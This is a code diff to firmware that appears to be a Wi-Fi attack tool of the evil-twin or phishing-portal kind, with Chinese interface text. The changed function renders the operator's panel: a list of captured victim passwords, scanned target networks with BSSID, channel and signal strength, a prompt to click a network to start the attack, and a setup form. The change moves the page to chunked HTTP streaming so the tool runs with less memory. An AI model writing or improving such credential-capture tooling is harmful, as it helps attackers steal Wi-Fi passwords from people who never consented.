@@ -509,8 +509,11 @@ static void onAttackLogin(void)
 /* ================================================================== */
 static void onConfigRoot(void)
 {
+    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+    server.send(200, "text/html; charset=utf-8", "");
+
     String html;
-    html.reserve(4000 + apCount * 400);
+    html.reserve(2048);
 
     html = F("<!DOCTYPE html><html lang='zh'><head>"
              "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
@@ -545,10 +548,11 @@ static void onConfigRoot(void)
              "<p>连接 <b>");
     html += setupSSID;
     html += F("</b>，点击目标 WiFi 开始攻击</p>");
+    
+    server.sendContent(html);
 
-    /* Show captured password history if available */
     if (pwdCount > 0) {
-        html += F("<div class='pwd-box'><h3>&#128273; 已捕获密码记录</h3>");
+        html = F("<div class='pwd-box'><h3>&#128273; 已捕获密码记录</h3>");
         for (int i = 0; i < pwdCount; i++) {
             html += F("<div class='pwd-item' style='flex-direction:column;align-items:flex-start;'><div style='width:100%;display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;'><div class='pwd-val'>");
             html += pwdHistory[i];
@@ -559,6 +563,7 @@ static void onConfigRoot(void)
             html += F("</div></div>");
         }
         html += F("</div>");
+        server.sendContent(html);
     }
 
     for (int i = 0; i < apCount; i++) {
@@ -592,23 +597,25 @@ static void onConfigRoot(void)
                      i, apSSID[i].c_str(), apCh[i],
                      apBSSID[i], apRSSI[i]);
         }
-        html += card;
+        server.sendContent(String(card));
     }
 
-    html += F("<a class='rescan' href='/rescan'>&#128260; 重新扫描</a>"
-              "<div style='margin-top:30px;padding:15px;background:#fff;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08);'>"
-              "<h3 style='margin:0 0 10px;font-size:15px;color:#333;text-align:center;'>&#128274; 修改后台热点配置</h3>"
-              "<form method='POST' action='/change_setup' style='text-align:center;'>"
-              "<input type='text' name='newssid' placeholder='后台 WiFi 名称' required maxlength='32' value='");
+    html = F("<a class='rescan' href='/rescan'>&#128260; 重新扫描</a>"
+             "<div style='margin-top:30px;padding:15px;background:#fff;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08);'>"
+             "<h3 style='margin:0 0 10px;font-size:15px;color:#333;text-align:center;'>&#128274; 修改后台热点配置</h3>"
+             "<form method='POST' action='/change_setup' style='text-align:center;'>"
+             "<input type='text' name='newssid' placeholder='后台 WiFi 名称' required maxlength='32' value='");
     html += setupSSID;
     html += F("' style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
-              "<input type='text' name='newpwd' placeholder='新密码 (至少8位)' required minlength='8' "
-              "style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
-              "<button type='submit' style='padding:8px 16px;background:#e63946;color:#fff;border:none;border-radius:6px;cursor:pointer;width:100%;font-weight:bold;'>保存并重启</button>"
-              "</form></div>"
-              "</body></html>");
-
-    server.send(200, "text/html; charset=utf-8", html);
+             "<input type='text' name='newpwd' placeholder='新密码 (至少8位)' required minlength='8' "
+             "style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
+             "<button type='submit' style='padding:8px 16px;background:#e63946;color:#fff;border:none;border-radius:6px;cursor:pointer;width:100%;font-weight:bold;'>保存并重启</button>"
+             "</form></div>"
+             "</body></html>");
+    server.sendContent(html);
+    
+    // Send an empty chunk to indicate the end of the HTTP response
+    server.sendContent("");
 }
 
 static void onConfigRescan(void)
